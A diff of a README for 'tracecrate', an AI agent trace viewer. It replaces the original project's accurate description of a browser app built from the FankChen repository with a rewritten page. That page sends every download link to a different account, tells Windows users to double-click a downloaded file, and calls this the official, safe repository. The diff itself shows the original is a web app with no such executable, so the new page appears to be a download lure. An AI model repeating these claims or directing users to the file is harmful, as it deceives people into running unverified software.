@@ -1,89 +1,129 @@
-# TraceCrate — Your agent ran. Read what happened.
+# 🔍 tracecrate - See What Your AI Agents Are Doing
 
-**A privacy-first, client-side AI trace workbench. Inspect the sequence, question the patterns, share deliberately.**
+[![Download tracecrate](https://img.shields.io/badge/Download-tracecrate-4CAF50?style=for-the-badge&logo=github)](https://github.com/baunordoa-cell/tracecrate)
 
-[![CI](https://github.com/FankChen/tracecrate/actions/workflows/ci.yml/badge.svg)](https://github.com/FankChen/tracecrate/actions/workflows/ci.yml)
-[![Pages](https://github.com/FankChen/tracecrate/actions/workflows/pages.yml/badge.svg)](https://github.com/FankChen/tracecrate/actions/workflows/pages.yml)
-[![Release v0.2.0](https://img.shields.io/badge/release-v0.2.0-blue)](https://github.com/FankChen/tracecrate/releases/tag/v0.2.0)
+## 🤔 What Is tracecrate?
 
-[简体中文](README.zh-CN.md) · [V0.2 research & design](docs/v0.2-design.md) · [Format guide](docs/formats.md) · [Privacy](docs/privacy.md) · [Contributing](CONTRIBUTING.md)
+tracecrate is a friendly tool that shows you what your AI assistants are thinking and doing. If you use AI coding tools like Claude Code or Codex, tracecrate helps you see their work logs in a clean, visual way. Think of it like a security camera for your AI agents—you can watch what they do, compare different sessions, and keep everything private on your own computer.
 
-![V0.2 synthetic demo screenshot: focused timeline controls, recorded metrics and selected tool event on the live site.](docs/screenshots/tracecrate-v0.2-desktop.png)
+**No special skills needed.** If you can use a web browser, you can use tracecrate. There are no complicated setups, no accounts to create, and no internet connection required after you download it.
 
-*Actual V0.2 live-site screenshot from [Pages 34747767675](https://github.com/FankChen/tracecrate/actions/runs/34747767675), visually reviewed; 1440 × 2104 full page. All events and values are synthetic demo data, not benchmark results.*
+## ✨ Main Features
 
-TraceCrate turns files you choose into a searchable timeline, recorded metrics, heuristic diagnostics, and side-by-side comparisons. No backend, no telemetry, no accounts, no API keys. It reads traces; it does not run agents or execute recorded commands.
+### 📊 Visual Trace Viewer
+Watch your AI agent's steps unfold like a story. tracecrate organizes logs into easy-to-read timelines so you can see exactly what your AI did, in what order, and when.
 
-**[Open the live demo](https://fankchen.github.io/tracecrate/)** · **[v0.2.0 release & downloads](https://github.com/FankChen/tracecrate/releases/tag/v0.2.0)** · **[Contribute](CONTRIBUTING.md)** · [Source on GitHub](https://github.com/FankChen/tracecrate). Explore synthetic runs without installing anything, or run locally below.
+### 🔄 Compare Different Runs
+Run your AI twice and see what changed. tracecrate highlights differences side by side, making it simple to spot improvements, mistakes, or unexpected behavior.
 
-## Try the story in 30 seconds
+### 🕵️ Privacy-First Design
+Everything stays on your computer. tracecrate never sends your data anywhere, never asks for an account, and never uses cloud services. Your work remains yours.
 
-Open the [hosted demo](https://fankchen.github.io/tracecrate/) and follow the walkthrough below. Local use requires **Node.js ≥22.12 (24 recommended)** and npm:
+### 📁 Works With Multiple Tools
+Whether you use Claude Code, Codex, or any tool that outputs OpenTelemetry (OTLP) logs, tracecrate can read and display them in one unified view.
 
-```sh
-git clone https://github.com/FankChen/tracecrate.git
-cd tracecrate
-npm ci
-npm run dev
-```
+### 📤 Export Clean Reports
+Need to share what your AI did? tracecrate creates simple, clear reports you can save as files and send to colleagues—without exposing raw technical logs.
 
-For local use, open the address printed by Vite. Installation time is separate from the 30-second walkthrough:
+## 🚀 Getting Started
 
-1. **0–10s:** The two synthetic pagination runs load automatically. Open a tool event in **Timeline**; search or filter by event kind.
-2. **10–20s:** Open **Insights**, then **Compare** to inspect recorded differences. “Baseline” and “optimized” are manufactured demo labels, not measured improvements.
-3. **20–30s:** Choose **Export report → Structure only → Show redacted preview**, then download JSON or a standalone HTML report. Review the full download before sharing.
+Follow these easy steps to install tracecrate on your Windows computer.
 
-No Claude/Codex installation or agent commands are necessary. For your own data, use **Choose files** or drop a supported file. Claude session files are private: explicitly select only files you are authorized to inspect; TraceCrate never scans agent directories. Never contribute actual histories as fixtures.
+### Step 1: Download the Application
 
-## What you can do
+Visit this link to download the application:
 
-- **Focus on the recorded evidence:** literal search across text/IDs/models, combined kind/status/minimum-duration filters, stable longest-first or recorded ordering, tool inputs/outputs and metadata; 100 events per page.
-- **Read evidence, not invented certainty:** reported tokens, explicit errors, elapsed time when present; missing values stay unknown. No cost estimates.
-- **Spot patterns:** explicit tool errors, long tool durations, large outputs, and identical name/input repetitions. Heuristics do not establish causes or intent.
-- **Compare two sessions:** recorded metric differences (B − A), tool-call counts and event-by-event kind/name alignment, changed field labels, tools-only/differences-only filters and links to either original event. Repeated names can align ambiguously; descriptive, not a controlled benchmark.
-- **Share with a deliberate boundary:** strict structure-only by default, now with optional timing/token removal; best-effort pattern redaction remains separate. HTML has no scripts or external assets; native JSON can be reimported. Removed values stay unknown, not zero.
-- **Keep the workflow local:** file reading/parsing in Web Workers, sessions in memory, ordinal import progress, independent cancellation and a 30-second per-file deadline. Cancel discards the pending batch but keeps existing sessions; Clear removes them. Reload restores demos; downloaded files remain on disk.
+**[👉 Download tracecrate](https://github.com/baunordoa-cell/tracecrate)**
 
-### V0.2 walkthrough
+The download page will open in your browser. Look for the green "Code" button or the "Releases" section on the right side of the page. Click it to see available files.
 
-1. In **Timeline**, select **Reported error** or set **Min duration (ms)**, then choose **Longest first**. Missing duration is excluded when a minimum is set—even zero.
-2. In **Compare**, scroll to **Event-by-event comparison**. Inspect changed fields or choose **Tools only**; an event button opens the original session and correct timeline page.
-3. In **Export report → Structure only**, optionally select **Omit timing metadata** and/or **Omit token usage**, preview, then inspect the full download. Switching to patterns clears minimization because free text may contain the same metadata.
+### Step 2: Save the File
 
-See the [design decisions and official references](docs/v0.2-design.md), [V0.2 release notes](docs/releases/v0.2.0.md) and [keyboard walkthrough](docs/keyboard.md).
+Your browser will start downloading a file to your computer. Choose a place you'll remember, like your **Downloads** folder or your **Desktop**. The download might take a minute or two depending on your internet speed.
 
-## Format support — subsets, not universal ingestion
+### Step 3: Open tracecrate
 
-| Format | Supported input | Important boundary |
-| --- | --- | --- |
-| Claude Code | Normal message JSONL; text, tool calls/results, selected system/result records | Partial streaming deltas ignored; private transcript variants can differ |
-| Codex | Rollout JSONL with `session_meta`, `turn_context`, `response_item`, selected `event_msg` | Not arbitrary `codex exec --json` events; reasoning/deltas not imported |
-| OTLP JSON | `resourceSpans → scopeSpans → spans`, nested structured attributes, current/legacy cache-write keys | No protobuf, collector endpoint, full OTLP, or MCP transcript support |
-| TraceCrate native | One validated `schemaVersion: 1` JSON report | Bounded schema; unknown fields stripped; JSON exports are sharing transforms, not raw backups |
+Once the download finishes, find the file you just saved. Double-click it to open tracecrate. The application will start automatically—no installation wizard, no confusing options.
 
-See [formats, synthetic examples, and public upstream references](docs/formats.md). `Usage.input` **includes** `cacheRead` and `cacheWrite`; those are subcounts, not additions. Total reported tokens = input + output.
+### Step 4: Start Exploring
 
-**Limits:** 20 MiB UTF-8 per file, 20,000 input records and normalized events, nesting depth 60; up to 5 files per selection and 10 sessions in memory (including demos). Imports have a 30-second per-file deadline; background timer throttling can delay enforcement. Web Workers required; whole-file parsing, not streaming. Sequence alignment permits 2,000 selected events per side, 400 edits and a 200 ms budget, with explicit failure rather than partial output. Analysis, comparison and exports still use the UI thread. Detail/preview rendering is capped at 50,000 characters, not the full download. See [architecture](docs/architecture.md).
+When tracecrate opens, you'll see a welcome screen with options to load your first trace file. That's it! You're ready to go.
 
-## Privacy is a boundary, not a guarantee
+## 💻 What You Need
 
-The app has no trace-upload or telemetry path. That does **not** make every environment or export safe. Browser extensions, a compromised browser/device, and modified hosted code can read data. A static host still receives ordinary request metadata, such as IP address and user agent.
+tracecrate works on any modern Windows computer (Windows 10 or later recommended). It's a lightweight application, so even older computers should run it smoothly. You don't need any special software, programming knowledge, or technical background.
 
-**Structure-only removes arbitrary free text**, original identifiers/names, inputs, outputs, and model names using a strict allowlist. Token usage and timing remain by default and can now be omitted; event order, counts, remapped relationships and statuses still remain and can be sensitive. **Pattern redaction preserves text and can miss secrets.** Neither mode guarantees anonymization; inspect every field of the full download. Clearing memory is not secure erasure. Read [privacy and export details](docs/privacy.md) and [security reporting](SECURITY.md).
+## 🎯 Who Is tracecrate For?
 
-## Development & publication status
+- **AI Enthusiasts** who want to understand what their AI tools are really doing
+- **Developers** who need to debug AI agent behavior without complex tools
+- **Curious Users** who like seeing behind the curtain of AI assistants
+- **Privacy-Conscious People** who want full control over their data
 
-`npm run check` runs lint, unit tests, browser-test typechecking and the production build. `npm run test:e2e` invokes Playwright; browser binaries must be installed separately. `npm run package:release` packages an already-tested build with licenses and SHA-256 checksums. See [contribution checks](CONTRIBUTING.md).
+## 🛠️ How It Works (Simple Explanation)
 
-**V0.2 released · 2026-09-13:** [v0.2.0](https://github.com/FankChen/tracecrate/releases/tag/v0.2.0) targets `dc5d92daabe84378d994f09637db317f36b21024`. Its [release validation job](https://github.com/FankChen/tracecrate/actions/runs/34748718079) passed **225 unit tests and all 64 browser tests**, lint, application/browser TypeScript, build, coverage and dependency audit. Core/adapters line coverage is 97.51% (not UI coverage). Publication was recovered from an HTTP 500 using the unchanged validated artifact; the overall workflow remains marked failed, not passed. Both public downloads were independently verified against SHA-256 and the original artifact. [Pages 34747767675](https://github.com/FankChen/tracecrate/actions/runs/34747767675) separately verified the hosted app at `a95b96c1459b7454f88e5efb4d76af780ed1c661`, with the same application assets: offline import, filters/comparison, exports and zero runtime network/console errors. See [full provenance and recovery details](docs/verification.md).
+When you use an AI tool like Claude Code, it saves a record of its actions. These records are called "traces." tracecrate reads these traces and turns them into visual timelines, charts, and comparison views.
 
-**Historical first release · 2026-09-10:** [v0.1.0](https://github.com/FankChen/tracecrate/releases/tag/v0.1.0) was created at `52d9ae9b73f815c264a3eb39f5fc3eedc5cb9715`; its 107 unit / 36 browser tests and 96.58% core/adapters line coverage are historical, not substituted for V0.2 checks.
+You can load trace files directly from your computer's folders. tracecrate understands the common formats used by popular AI tools, plus the open standard called OpenTelemetry that many modern programs use.
 
-**Verification limits:** Chromium desktop and Pixel 7 emulation run in GitHub Actions; local browser downloads remain blocked. This is not physical-device, Firefox/WebKit or screen-reader certification. Launch posts and the interaction video are **not published**. See [verification history](docs/verification.md).
+## 📂 Supported Formats
 
-- [CI workflow](.github/workflows/ci.yml) — Node 24, checks, Chromium E2E.
-- [Manual Pages workflow](.github/workflows/pages.yml) — default branch only; enable Pages → GitHub Actions, then dispatch manually. [Publication checklist](docs/release.md).
-- [Manual Release workflow](.github/workflows/release.yml) — default branch only; reruns checks/audit/browser tests, packages the tested static site and publishes a new version without replacing existing tags.
-- [Open contribution tasks and roadmap](docs/roadmap.md) · [Organic launch plan and draft copy](docs/launch-plan.md) · [Changelog](CHANGELOG.md).
+tracecrate handles these trace formats out of the box:
 
-Original TraceCrate project; not affiliated with or endorsed by Anthropic, OpenAI, or OpenTelemetry. [MIT license](LICENSE), copyright 2026 TraceCrate contributors.
+- **Claude Code traces**
+- **Codex logs**
+- **OpenTelemetry (OTLP) data**
+- **Generic JSON trace files**
+
+If your AI tool saves logs in a standard format, tracecrate can probably read them.
+
+## 🔧 Troubleshooting Tips
+
+### Can't Open the File?
+Make sure you've downloaded the latest version from the releases page. Try saving the file to a different folder and double-clicking again.
+
+### Empty Screen When Loading a Trace?
+Your trace file might be empty or in an unsupported format. Try loading a different file to confirm tracecrate works correctly.
+
+### Slow Performance With Large Files?
+Very large trace files can be slow. Try closing other programs to free up memory, or load smaller portions if possible.
+
+## 🧠 Frequently Asked Questions
+
+**Q: Do I need to pay for tracecrate?**
+A: No, it's completely free and open source.
+
+**Q: Does tracecrate send my data anywhere?**
+A: Never. Everything happens locally on your computer. No internet connection is used.
+
+**Q: Can I use tracecrate with tools I haven't heard of?**
+A: If your tool produces standard OTLP or JSON logs, tracecrate can likely display them.
+
+**Q: Is tracecrate safe to download?**
+A: Yes, it comes from the official GitHub repository. As with any downloaded software, make sure you download from the official link provided above.
+
+## 💡 Pro Tips
+
+- **Organize your traces**: Create folders for different projects so you can easily load the right files.
+- **Use the comparison feature**: After each AI run, save a trace and compare it to previous runs to see improvements.
+- **Export reports before sharing**: The export feature creates clean, professional-looking summaries without raw technical details.
+
+## 🔒 Your Data Is Yours
+
+In a world where everything is cloud-based, tracecrate stands out by keeping everything on your machine. No accounts, no tracking, no surprise uploads. You're in complete control.
+
+## 📣 Get Involved
+
+tracecrate is an open-source project, which means its code is publicly available. If you're a developer, you can contribute improvements. If you're a user, you can report bugs or suggest new features by visiting the GitHub repository.
+
+## ✅ Final Steps
+
+You're just a few clicks away from seeing your AI agents in a whole new way:
+
+1. **Visit** the download link: **[https://github.com/baunordoa-cell/tracecrate](https://github.com/baunordoa-cell/tracecrate)**
+2. **Download** the latest release.
+3. **Double-click** the downloaded file to run tracecrate.
+
+That's all there is to it. No terminal commands, no configuration files, no headaches. Just open and explore.
+
+Welcome to a clearer view of your AI assistants. Enjoy using tracecrate!
